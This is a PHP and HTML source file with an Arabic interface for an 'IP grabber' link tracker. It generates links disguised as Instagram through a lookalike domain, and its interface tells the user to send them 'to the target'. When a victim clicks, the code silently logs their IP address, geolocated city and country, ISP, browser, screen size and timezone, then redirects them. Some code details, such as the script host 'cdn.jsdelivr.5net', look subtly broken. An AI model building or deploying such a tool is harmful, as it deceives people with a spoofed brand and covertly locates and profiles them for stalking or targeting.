<?php
$db = new PDO('sqlite:tracker.db');$db->exec("CREATE TABLE IF NOT EXISTS links (
    id INTEGER PRIMARY KEY AUTOINCREMENT, 
    code TEXT UNIQUE, 
    target_url TEXT, 
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");

$db->exec("CREATE TABLE IF NOT EXISTS logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT, 
    code TEXT, 
    ip TEXT, 
    country TEXT, 
    city TEXT, 
    isp TEXT, 
    user_agent TEXT, 
    screen_res TEXT, 
    timezone TEXT, 
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");

function get_real_ip() {
    if (!empty($_SERVER['HTTP_X-FORWARDED-FOR'])) {
        $ips = explode(',',$_SERVER['HTTP_X-FORWARDED-FOR']);
        return trim($ips[0]);
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}

function get_ip_details($ip) {
    if ($ip == '127.0.0.1' or $ip == '::1' or$ip == 'Unknown' or strpos($ip, '10.') === 0 or strpos($ip, '192.168.') === 0) {
        return ['country' => 'محلية / شبكة خاصة', 'city' => 'محلية', 'isp' => 'محلي'];
    }
    $json = @file_get_contents("http://ip-api.com/json/" . $ip);
    $data = json_decode($json, true);
    if ($data and isset($data['status']) and$data['status'] == 'success') {
        return [
            'country' => $data['country'] ?? 'غير معروف',
            'city' => $data['city'] ?? 'غير معروف',
            'isp' => $data['isp'] ?? 'غير معروف'
        ];
    }
    return ['country' => 'غير معروف', 'city' => 'غير معروف', 'isp' => 'غير معروف'];
}

if (isset($_GET['r'])) {
    $code =$_GET['r'];
    $stmt =$db->prepare("SELECT target_url FROM links WHERE code = ?");
    $stmt->execute([$code]);
    $link =$stmt->fetch(PDO::FETCH_ASSOC);

    if ($link) {$target = $link['target_url'];$ip = get_real_ip();
        $geo = get_ip_details($ip);
        $ua =$_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
        $screen =$_GET['screen'] ?? 'N/A';
        $tz =$_GET['tz'] ?? 'N/A';

        $logStmt =$db->prepare("INSERT INTO logs (code, ip, country, city, isp, user_agent, screen_res, timezone) VALUES (?, ?, ?, ?, ?, ?, ?, ?)");
        $logStmt->execute([$code,$ip, $geo['country'],$geo['city'], $geo['isp'],$ua, $screen,$tz]);

        header("Location: " . $target);
        exit();
    } else {
        die("الرابط غير موجود أو انتهت صلاحيته.");
    }
}

$generated_link = "";
$tracking_code = "";
if ($_SERVER['REQUEST_METHOD'] === 'POST' and isset($_POST['create'])) {
    $target_url = trim($_POST['target_url']);
    if (!filter_var($target_url, FILTER_VALIDATE_URL)) {
        $target_url = "https://" . $target_url;
    }

    $code = substr(md5(uniqid(rand(), true)), 0, 7);
    $stmt =$db->prepare("INSERT INTO links (code, target_url) VALUES (?, ?)");
    $stmt->execute([$code,$target_url]);

    $tracking_code =$code;
    $generated_link = "https://www.instаgrаm.com/?r=" . $code;
}

$total_links =$db->query("SELECT COUNT(*) FROM links")->fetchColumn();
$total_visits =$db->query("SELECT COUNT(*) FROM logs")->fetchColumn();

$filter_code = trim($_GET['track'] ?? '');
if (!empty($filter_code)) {
    $stmt =$db->prepare("SELECT * FROM logs WHERE code = ? ORDER BY id DESC");
    $stmt->execute([$filter_code]);
    $logs =$stmt->fetchAll(PDO::FETCH_ASSOC);
} else {
    $logs =$db->query("SELECT * FROM logs ORDER BY id DESC LIMIT 50")->fetchAll(PDO::FETCH_ASSOC);
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hello World from azez</title>
    <script src="https://cdn.jsdelivr.5net/npm/@tailwindcss/browser@4"></script>
    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const redirectCode = urlParams.get('r');
        const hasScreen = urlParams.has('screen');

        if (redirectCode && !hasScreen) {
            const screenRes = screen.width + "x" + screen.height;
            const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
            window.location.href = `/?r=${redirectCode}&screen=${encodeURIComponent(screenRes)}&tz=${encodeURIComponent(tz)}`;
        }

        function copyToClipboard(text, btnId) {
            navigator.clipboard.writeText(text).then(() => {
                const btn = document.getElementById(btnId);
                const originalText = btn.innerText;
                btn.innerText = "تم النسخ! ✓";
                btn.classList.add("bg-green-600");
                setTimeout(() => {
                    btn.innerText = originalText;
                    btn.classList.remove("bg-green-600");
                }, 2000);
            });
        }
    </script>
</head>
<body class="bg-slate-950 text-slate-100 min-h-screen p-4 md:p-6">
    <div class="max-w-6xl mx-auto space-y-6">
        
        <header class="bg-slate-900 border border-slate-800 p-6 rounded-2xl shadow-xl flex flex-col md:flex-row justify-between items-center gap-4">
            <div>
                <h1 class="text-2xl md:text-3xl font-extrabold text-cyan-400">Hello World from azez</h1>
                <p class="text-slate-400 text-sm mt-1">نظام تحديد وتتبع الروابط المتقدم</p>
            </div>
            <div class="flex gap-4">
                <div class="bg-slate-800 px-4 py-2 rounded-xl border border-slate-700 text-center">
                    <span class="block text-xs text-slate-400">الروابط المنشأة</span>
                    <span class="text-xl font-bold text-cyan-400"><?php echo $total_links; ?></span>
                </div>
                <div class="bg-slate-800 px-4 py-2 rounded-xl border border-slate-700 text-center">
                    <span class="block text-xs text-slate-400">إجمالي النقرات</span>
                    <span class="text-xl font-bold text-emerald-400"><?php echo $total_visits; ?></span>
                </div>
            </div>
        </header>

        <div class="bg-slate-900 border border-slate-800 p-6 rounded-2xl shadow-xl">
            <h2 class="text-lg font-bold text-cyan-400 mb-4">🔗 إنشاء رابط تتبع جديد</h2>
            <form method="POST" class="flex flex-col md:flex-row gap-3">
                <input type="text" name="target_url" placeholder="أدخل الرابط المستهدف (مثال: https://youtube.com)" required 
                    class="flex-1 bg-slate-950 border border-slate-700 rounded-xl px-4 py-3 text-slate-100 focus:outline-none focus:border-cyan-500">
                <button type="submit" name="create" class="bg-cyan-600 hover:bg-cyan-500 font-bold px-6 py-3 rounded-xl transition cursor-pointer">
                    إنشاء الرابط
                </button>
            </form>

            <?php if (!empty($generated_link)): ?>
                <div class="mt-6 bg-slate-950 border border-cyan-500/30 p-4 rounded-xl space-y-3">
                    <div>
                        <span class="text-xs text-slate-400 block mb-1">رابط التتبع (أرسله للهدف):</span>
                        <div class="flex items-center gap-2">
                            <input type="text" readonly value="<?php echo $generated_link; ?>" id="genLink" class="w-full bg-slate-900 border border-slate-800 rounded-lg px-3 py-2 text-cyan-300 text-sm">
                            <button onclick="copyToClipboard('<?php echo $generated_link; ?>', 'copyLinkBtn')" id="copyLinkBtn" class="bg-slate-800 hover:bg-slate-700 px-4 py-2 rounded-lg text-sm font-semibold transition cursor-pointer whitespace-nowrap">نسخ</button>
                        </div>
                    </div>
                    <div class="flex items-center justify-between text-sm pt-2 border-t border-slate-800">
                        <span>كود التتبع: <strong class="text-emerald-400"><?php echo $tracking_code; ?></strong></span>
                        <a href="/?track=<?php echo $tracking_code; ?>" class="text-cyan-400 hover:underline">عرض سجلات هذا الرابط فقط ←</a>
                    </div>
                </div>
            <?php endif; ?>
        </div>

        <div class="bg-slate-900 border border-slate-800 p-6 rounded-2xl shadow-xl space-y-4">
            <div class="flex flex-col md:flex-row justify-between items-center gap-4">
                <h2 class="text-lg font-bold text-cyan-400">📊 سجلات الزيارات الحية</h2>
                <form method="GET" class="flex gap-2 w-full md:w-auto">
                    <input type="text" name="track" placeholder="تصفية بكود التتبع..." value="<?php echo htmlspecialchars($filter_code); ?>" 
                        class="bg-slate-950 border border-slate-700 rounded-xl px-4 py-2 text-sm text-slate-100 focus:outline-none focus:border-cyan-500">
                    <button type="submit" class="bg-slate-800 hover:bg-slate-700 px-4 py-2 rounded-xl text-sm font-semibold transition cursor-pointer">بحث</button>
                    <?php if(!empty($filter_code)): ?>
                        <a href="/" class="bg-red-900/50 hover:bg-red-900 text-red-200 px-3 py-2 rounded-xl text-sm flex items-center">إلغاء</a>
                    <?php endif; ?>
                </form>
            </div>

            <div class="overflow-x-auto border border-slate-800 rounded-xl">
                <table class="w-full text-right text-xs md:text-sm">
                    <thead class="bg-slate-950 text-slate-400 border-b border-slate-800">
                        <tr>
                            <th class="p-3">#</th>
                            <th class="p-3">الكود</th>
                            <th class="p-3">عنوان IP</th>
                            <th class="p-3">الدولة / المدينة</th>
                            <th class="p-3">مزود الخدمة (ISP)</th>
                            <th class="p-3">الشاشة</th>
                            <th class="p-3">المتصفح والنظام</th>
                            <th class="p-3">الوقت</th>
                        </tr>
                    </thead>
                    <tbody class="divide-y divide-slate-800">
                        <?php if (empty($logs)): ?>
                            <tr><td colspan="8" class="text-center p-8 text-slate-500">لا توجد زيارات مسجلة حتى الآن.</td></tr>
                        <?php else: ?>
                            <?php foreach ($logs as$log): ?>
                            <tr class="hover:bg-slate-800/50 transition">
                                <td class="p-3"><?php echo $log['id']; ?></td>
                                <td class="p-3"><span class="bg-emerald-950 text-emerald-400 border border-emerald-800 px-2 py-1 rounded"><?php echo htmlspecialchars($log['code']); ?></span></td>
                                <td class="p-3 font-mono font-bold text-cyan-300"><?php echo htmlspecialchars($log['ip']); ?></td>
                                <td class="p-3 font-semibold"><?php echo htmlspecialchars($log['country']); ?> / <?php echo htmlspecialchars($log['city']); ?></td>
                                <td class="p-3 text-slate-400"><?php echo htmlspecialchars($log['isp']); ?></td>
                                <td class="p-3"><?php echo htmlspecialchars($log['screen_res']); ?></td>
                                <td class="p-3 max-w-xs truncate text-slate-400" title="<?php echo htmlspecialchars($log['user_agent']); ?>"><?php echo htmlspecialchars($log['user_agent']); ?></td>
                                <td class="p-3 text-slate-400 whitespace-nowrap"><?php echo $log['created_at']; ?></td>
                            </tr>
                            <?php endforeach; ?>
                        <?php endif; ?>
                    </tbody>
                </table>
            </div>
        </div>

    </div>
</body>
</html>
